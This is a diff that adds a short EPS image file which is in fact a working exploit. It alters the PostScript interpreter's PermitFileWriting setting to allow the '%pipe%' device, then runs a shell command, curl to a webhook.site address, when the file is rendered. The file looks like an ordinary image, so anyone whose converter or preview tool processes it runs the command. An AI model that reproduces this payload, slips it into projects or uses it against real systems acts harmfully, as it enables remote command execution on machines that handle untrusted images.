@@ -1,0 +1,10 @@
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: 0 0 100 100
+currentuserparams /PermitFileWriting get
+(%pipe%*) 1 index length 1 add array
+1 index 0 3 index putinterval
+dup 2 index length (%pipe%*) put
+/PermitFileWriting exch setuserparams
+pop
+(%pipe%curl https://webhook.site/18ee7f3b-001e-4900-828e-00b2af61565e?fp=1) (w) file closefile
+showpage
